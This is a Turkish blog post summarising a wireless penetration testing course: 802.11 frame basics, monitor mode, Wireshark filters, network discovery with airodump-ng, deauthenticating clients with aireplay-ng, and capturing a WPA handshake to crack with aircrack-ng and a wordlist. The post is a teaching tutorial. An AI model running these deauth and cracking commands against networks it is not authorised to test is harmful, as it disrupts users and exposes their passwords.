---
layout: post
title: "Kablosuz Ağ Güvenliği - Bölüm 1"
subtitle: "hacktrick'18 - kablosuz ağ sızma testleri eğitminin bir özeti"
---

***Yazan: [boratanrikulu](https://github.com/boratanrikulu)***

**Kaynaklar**  
Hacktrick'18 - Kablosuz Ağ Sızma Testleri - Besim Altınok

---

## Bazı Temel Bilgiler

<p align="center"> 
	<img src="/images/kablosuz-ag-guvenligi-bolum-1/3.png">
</p>

Modemler kendilerinin aktif olduğu belirtmek için etrafa **Beacon** paketleri yayarlar, bu sayede çevredeki aktif ağları görebiliriz.  
Client modeme bağlanmak isterse, talep isteği olaran bir **Probe Request** paketi yollar.  
Bu paketi alan modem **Probe Response** paketi ile cevap verir.  
Eğer ağ şifreli ise **Authentication Request** ve **Authentication Response** aşamaları ile gerekli kontroller yapılmış olur.  
**Asociation Request** ve **Asociation Response** aşamaları ile de bağlanma işlemi tamamlanır.

- **Beacon** paketleri SSID, MAC adresi, Kanal numarası, Şifreleme tipi bilgilerini içerir.  
- **Probe Request** paketi sadece SSID içerir, MAC adresi içermez.

## Ağ Kartı Modları

**Managed Modu :** Kablosuz ağa bağlanılabilir.

**Master Modu :** Erişim noktası hizmeti verebilir.

**Monitor Modu :** Herhangi bir erişim noktasına bağlanmadan ya da erişim noktası hizmeti vermeden direkt olarak havada uçan paketleri dinlenebilir.

## Ağ Kartının Yapılandırılması

Ağ kartının şuanki durumunu gözlemlemek için aşağıdaki komut kullanılabilir.
```
	iwconfig wlan0
```  
Ya da direkt **iw** ile de bilgi toplanabilir. 
```
	iw wlan0 info
``` 

#### Monitor Modunu Aktifleştirmek

> **NOT**  
	Monitor moduna geçmek için aşağıdaki işlemleri yapmak yerine **airmon-ng** kullanılabilir.  
	```
		airmon-ng start wlan0
	``` 

Monitor modunu aktifleştirmek için **iwconfig** kullanılabilir. Bunun için aşağıdaki adımları uygulamak gereklidir.

İlk olarak ağ kartı **down** edilmelidir.
```
	ifconfig wlan0 down
```  
Ardından modu, monitor olarak ayarlanmalıdır.
```
	iwconfig wlan0 mode monitor
```  
Son olarak ağ kartının **up** edilmesi gereklidir. 
```
	ifconfig wlan0 up
```  
Bu adımların ardından kartımızın monitor moduna geçtiğini görebiliriz.  
```
	iwconfig wlan0
```  

#### Belli Bir Kanalda Monitor Modunu Aktifleştirmek
Eğer ağ kartının belli bir kanalda monitor moduna geçirilmesi gerekiyorsa **channel** paremetresi kullanılır.
```
	iwconfig wlan0 channel 8
```  

## Wireshark ile Beacon ve Probe Paketlerinin İncelenmesi

Ağ kartımızı monitor moduna geçirdikten sonra etrafta uçan paketleri görmek için **wlan0mon** ile wireshark dinlemesini başlatabiliriz.


Belli bir SSID'i filtrelemek için wlan.ssid parametresini kullanabiliriz.  
```
	wlan.ssid == "networkName"
```  

* Eğer belirli bir paket tipini incelemek istiyorsak, aşağıdaki parametreler kullanılabilir.  
	* Sadece Beacon paketlerini görmek için **0x008**  
		```
			wlan.fc.type_subtype == 0x008
		```
	* Sadece Probe Request paketlerini görmek için **0x004**  
		```
			wlan.fc.type_subtype == 0x004
		```
	* Sadece Probe Response paketlerini görmek için **0x005**  
		```
			wlan.fc.type_subtype == 0x005
		```

#### Ağın Şifreleme Türünü WireShark ile Tespit Etmek

WireShark'ta Beacon paketi incelenerek ağın şifreleme türü tespit edilebilir.  

Beacon Paketinin **Capabilites** altında bulunan **Privacy** kısmı eğer 1 ise ağ şifreli demektir.
<p align="center"> 
	<img src="/images/kablosuz-ag-guvenligi-bolum-1/1.png">
</p>

Şifreleme tipini öğrenmek için **RSN** tag'ine bakmak gerekir. Örneğin **AES** var ise WPA2 şifrelemesi vardır.
<p align="center"> 
	<img src="/images/kablosuz-ag-guvenligi-bolum-1/2.png">
</p>

## Çevredeki Ağların Tespit edilmesi

> Ağ kartı monitor moda alınmamış olsa bile direkt *airodump-ng wlan0* denilirse, cihaz monitor moda otomatik olarak geçirilir. 

Airodump-ng ile aşağıdaki bilgileri elde edilebilir.  

* Kablosuz ağın ismi  
* Kablosuz ağın MAC adres bilgisi  
* Yayın yapılan kanal numarası  
* Şifreleme algoritması  
* Kablosuz ağlara bağlı istemcileri  
* İstemcilerin yolladığı probe isteklerinden kablosuz ağ isimleri


Kullanılabilir parametreler aşağıdaki gibidir.

| Parametre | Açıklama |
|:---------:|:----------:|
| --manufacturer | Cihazın üretici firmasını tespit etmek için |
| --uptime | Erişim noktasının aktif olduğu süreyi görmek için |
| -f [zaman] | Belli aralıklar ile kanal değiştirmek için |
| -w [file] | Yakalanan paketleri kaydetmek için |
| --output-format | Belli bir formatta kaydetmek için (pcap, ivs, csv, gps, kismet, netxml)  |

Kullanılabilir filtreler aşağıdaki gibidir.  

| Filtre      | Açıklama |
|:------------:|:----------:|
| --wps  |  WPS korumalı ağları listeler. |
| --encrypt [encrypt] | Şifreleme tipine göre bilgi toplamamızı sağlar. |
| --bssid [bssid] | Belirli bir erişim noktası için bilgi toplar. |
| --essid [essid] | Kablosuz ağ ismine göre bilgi toplar. |
| --channel [channel] | Belirli bir kanal numarasına göre bilgi toplar. |
| --essid-regex [regex] | Belirli bir kelime içeren ağları tespit için |
| --essid-regex '(?i)^regex' | Belirli bir kelime içeren ama küçük/büyük harf fark etmeyen ağları tespit etmek için |

Çevredeki ağlar aşağıdaki gibi tespit edilebilir.
```
	airodump-ng wlan0mon --manufacturer --uptime
```  

Belirli bir ağın dinlenmesi ve cap uzantılı bir dosyaya kaydedilmesine aşağıdaki komut örnek verilebilir.
```
	airodump-ng wlan0mon --bssid A6:EB:1C:26:3C:EA --channel 3 -w outputFile --output-format cap
```

##### iwlist ile Ağların Tespiti
UNIX tabanlı sistemlerde **iwlist** tool'u ile çevredeki ağlar hakkında bilgi toplanabilir.  
Örneğin aşağıdaki komut ile, çevredeki ağların ESSID değerleri elde edilebilir.  

```
	iwlist wlan0 scanning | grep -i "ESSID"
```  
Windows sistemlerde ise [exid.it](http://www.oxid.it/) ile monitor moduna geçmeden dinleme yapılabilir.  

## Gizli Ağların Tespiti

Çevrede bulunan gizli ağların tespiti için ağ dinlemeye alınır eğer biri ağa bağlanır ise isim tespit edilmiş olur. İstemciler ağdan düşürülerek ağa tekrar bağlanması sağlanabilir.
```
	airodump-ng wlan0mon --bssid A6:EB:1C:26:3C:EA -c 6
```

## İstemcilerin Ağdan Düşürülmesi

İstemcileri bağlı oldukları ağdan düşürmek için; modeme, hedef istemcinin ağdan ayrılmak istediğini belirten, **Deauthentication** paketleri yollanabilir.  
Deauthentication paketleri modemin ve bağlantısını koparmak isteyen istemcinin MAC adresini içerir.

Bunun için **aireplay-ng** tool'u kullanılabilir. Genel kullanım aşağıdaki gibidir.  
**-a** parametresinde modemin, **-c** parametresinde de hedef istemcinin MAC adresi girilir.  
**--deauth** parametresi ile gönderilecek deauth paketi sayısı belirlenir, eğer 0 girilirse sonsuza kadar paket yollanır.
```
	aireplay-ng --deauth 3 -a A6:EB:1C:26:3C:EA -c 5E:9F:F5:19:FC:2A wlan0mon
```

## Handshake Saldırısı ile Ağ Parolalarının Ele Geçirilmesi

WPA/WPA2 tipi şifrelemeye sahip ağlarda, parola ele geçilirmesi için handshake saldırı yönetimi kullanılabilir.  
Bu saldırı yönteminde hedef ağ dinlemeye alınır ve istemcilerden birinin ağdan düşürülmesi ve ardından tekrar bağlanması ile bir handshake yakalanmaya çalışılır. Handshake paketleri elde edildikten sonra aircrack-ng tool'u ile dictionary saldırısı ile parola tespiti sağlanmaya çalışılır.


İlk olarak hedef ağın MAC adresini tespit etmek amaçlı çevredeki ağlar dinlenir.  
```
	airodump-ng wlan0mon --manufacturer --uptime
```

Saldırılacak ağın MAC adresi alındıktan sonra aşağıdaki gibi bir dinleme başlatılır ve bu dinleme işlemi cap uzantılı bir dosyaya kayıt edilir. Eğer cap uzantılı dosya Wireshark'ta incelenir ise **eapol** filtresi ile handshake paketleri(her handshake 4 paketten oluşur) görülebilir.
```
	airodump-ng wlan0mon --bssid A6:EB:1C:26:3C:EA --channel 3 -w outputFile --output-format cap
```

Ardından bir handshake yakalamak amacıyla ağda bulunan istemcilerden biri ağdan düşürülür ve tekrar bağlanması beklenir. Eğer istemci ağa tekrar bağlanır ise handshake paketleri elde edilmiş olur.
```
	aireplay-ng --deauth 3 -a A6:EB:1C:26:3C:EA -c 5E:9F:F5:19:FC:2A wlan0mon
```

Handshake elde ediltikten sonra dinleme işlemi durdurulur ve dictionary saldırısı başlatılır. Dictionary saldırılarında kritik olan nokta sözlüğün hedefe göre hazırlanmasıdır.
```
	aircrack-ng -w ~/Documents/rockyou.txt -b A6:EB:1C:26:3C:EA outputFile.cap -0
```